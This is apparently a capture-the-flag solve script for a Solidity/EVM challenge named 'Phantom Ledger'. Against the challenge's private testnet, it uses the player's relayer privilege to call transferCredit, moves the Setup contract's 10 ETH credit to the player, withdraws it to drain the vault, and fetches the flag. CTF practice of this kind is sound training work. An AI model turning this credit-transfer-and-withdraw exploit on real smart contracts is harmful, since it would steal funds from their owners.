#!/usr/bin/env python3
"""
Phantom Ledger - Automated Exploit Script
Category: Blockchain (Solidity / EVM)
Points: 100
"""

from web3 import Web3
import requests, json, os, sys

base_url = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("CHALLENGE_URL")
if not base_url:
    raise SystemExit("usage: solve.py CHALLENGE_URL")
base_url = base_url.rstrip("/")
session = requests.Session()

print("[*] Launching challenge instance on private EVM testnet...")
r = session.post(f"{base_url}/launch")
data = r.json()

rpc_url = data["0"]["RPC_URL"].replace("{ORIGIN}", base_url)
privkey = data["1"]["PRIVKEY"]
setup_addr = Web3.to_checksum_address(data["2"]["SETUP_CONTRACT_ADDR"])
wallet_addr = Web3.to_checksum_address(data["3"]["WALLET_ADDR"])

print(f"[+] RPC: {rpc_url}")
print(f"[+] Setup: {setup_addr}")
print(f"[+] Player Wallet: {wallet_addr}")

w3 = Web3(Web3.HTTPProvider(rpc_url))
account = w3.eth.account.from_key(privkey)

# 1. Query Setup to get PhantomVault address
vault_sig = w3.keccak(text="vault()")[:4]
result = w3.eth.call({"to": setup_addr, "data": "0x" + vault_sig.hex()})
vault_addr = Web3.to_checksum_address("0x" + result.hex()[-40:])
print(f"[+] Vault: {vault_addr} (balance: {w3.from_wei(w3.eth.get_balance(vault_addr), 'ether')} ETH)")

# 2. Exploit: Player is the designated relayer in Setup.sol
# Call transferCredit(setup_addr, player_addr, 10 ether) to steal Setup's internal credit
transfer_sig = w3.keccak(text="transferCredit(address,address,uint256)")[:4]
ten_ether = w3.to_wei(10, 'ether')
calldata1 = "0x" + (
    transfer_sig +
    bytes.fromhex(setup_addr[2:].zfill(64)) +
    bytes.fromhex(account.address[2:].zfill(64)) +
    ten_ether.to_bytes(32, 'big')
).hex()

tx1 = {
    "to": vault_addr,
    "data": calldata1,
    "gas": 200000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count(account.address),
    "chainId": w3.eth.chain_id,
}
signed1 = account.sign_transaction(tx1)
receipt1 = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(signed1.raw_transaction))
print(f"[+] transferCredit tx confirmed (status: {receipt1['status']})")

# 3. Withdraw the transferred 10 ETH credit to player's wallet
withdraw_sig = w3.keccak(text="withdraw(uint256)")[:4]
calldata2 = "0x" + (withdraw_sig + ten_ether.to_bytes(32, 'big')).hex()

tx2 = {
    "to": vault_addr,
    "data": calldata2,
    "gas": 200000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count(account.address),
    "chainId": w3.eth.chain_id,
}
signed2 = account.sign_transaction(tx2)
receipt2 = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(signed2.raw_transaction))
print(f"[+] withdraw tx confirmed (status: {receipt2['status']})")

# 4. Verify Vault balance is 0
vault_balance = w3.eth.get_balance(vault_addr)
print(f"[+] Vault balance after exploit: {vault_balance} wei")

# 5. Fetch Flag
flag_r = session.get(f"{base_url}/flag")
print(f"\n[+] Flag: {flag_r.json().get('flag')}")
